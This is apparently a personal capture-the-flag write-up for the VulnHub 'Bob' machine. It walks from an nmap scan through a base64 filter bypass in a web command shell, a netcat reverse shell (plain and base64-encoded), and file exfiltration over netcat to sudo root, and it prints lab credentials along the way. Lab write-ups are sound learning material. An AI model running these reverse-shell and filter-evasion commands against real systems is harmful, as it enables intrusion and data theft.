**🖥️  \[ BOB \]**

| :-: | :-: | :-: | :-: |

*.*


| **Platform:** |  VulnHub |
| - | - |
| **IP Address:** | \[10.74.145.75 \] |
| **URL (if web app):** | \[  ~~***[https://download.vulnhub.com/bob/Bob\_v1.0.1.ova**](https://download.vulnhub.com/bob/Bob_v1.0.1.ova) \] |
| **Difficulty:** | Easy  |
| **OS:** | Linux  |
| **Category:** |  Mixed |
| **Date:** | \[ 2026-07-19\] |


**Description:**

***The Milburg Highschool Server has just been attacked, the IT staff have taken down their windows server and are now setting up a linux server running ![](data:image/png;base64,)Debian.Your Goal is to get the flag in. **




# **🛠️  Tools Used**

- Nmap

- Netcat

- Base64 encoder/decoder

- Reverse Shell

- TTY Spawn Shell

# **🔍  Reconnaissance**

| ***✍ HOW TO WRITE THIS: This section always applies, network or web. Its only job is to answer: what's running, and what's the most promising lead? Keep the output trimmed to lines that matter — don't paste 1000 lines of a full port scan.*** |
| - |

## **Port Scan**

Command used:

| nmap -Pn -p- -sV -sC -O -T4 -A  10.74.145.75 |
| - |


Output:

![](data:image/png;base64,)  
lets check out web,  ***the file dev\_shell.php looks suspicious. but while visiting other files I don't get any sensitive content. so let's go for dev\_shell.php**


***In dev\_shell.php, i found out command shell which gives output of a commands on screen.**

***  
  
![](data:image/png;base64,)I run basic commands  and found out ls, cat , nc commands are not working. And view its source code and found out it gives output from server side.**

***  
Then try pipelining to encode the command and decrypt it and execute it so it bypass input filters and gives output  
  
command\>  ls  \{its blacklisted\}  
encrypted command\> echo bHM= |base64 -d | bash**




*![](data:image/png;base64,)**  
**


***  
Then i searched for netcat, if available i can use reverseshell**


![](data:image/png;base64,)  
Then open listener on port 4444   
command\> nc -lnvp 4444  
then put encrypted netcat revershell  
command\>  nc 10.74.145.45 4444 -e /bin/bash

encrypted command \>   
echo bmMgMTAuNzQuMTQ1LjQ1IDQ0NDQgLWUgL2Jpbi9iYXNo | base64 -d | bash  
Got Shell !!  and then upgrade the shell by using TTY Spawn Shell!



Then searched for every user finding something important there and found out txt file named theadminisdumb inside the user- elliot and found out the credentials of james and elliot  
James: Qwerty  
Elliot: theadminisdumb



![](data:image/png;base64,)  


Then searched for user- bob ***I found a file called old\_passwordfile.html which contains jc and seb user passwords. But nothing is interesting there. after few minutes of enumeration inside /home/bob/Documents/ , there are some sensitive contents and notes. also there is a file called login.txt.gpg which is protected.**

***To get the file in local system to decrypt it i use netcat,**

***Command\>**

***nc -lnvp 4444 \> login.txt.gpg     \{open listener\}  
cat /tmp/login.txt.gpg | nc 10.74.145.75 4444    \{revershell \}**

***and got file in tmp folder!**




***Try to open it using gpg decrypt but it asks for passkey !**

***Then saw staff.txt file contains some descriptions about other user-created by bob. then visit the Secret directory. inside subfolders, we found a script called notes.sh which contains the given content**

![](data:image/png;base64,)  
try to make a word using the first letter of every line and got a word “HARPOCRATES”  by basic search found out-



then try this as a Password for that gpg file to decrypt it and it opens and found out bob’s credentials   
bob:b0bcat\_





after it login and searched for every user that have privileges of root user, 





Then found out bob have all the priviliges of root!

![](data:image/png;base64,)  
Then using sudo take root access, And captured flag file, now privilege escalation is completed and we got entire server access.
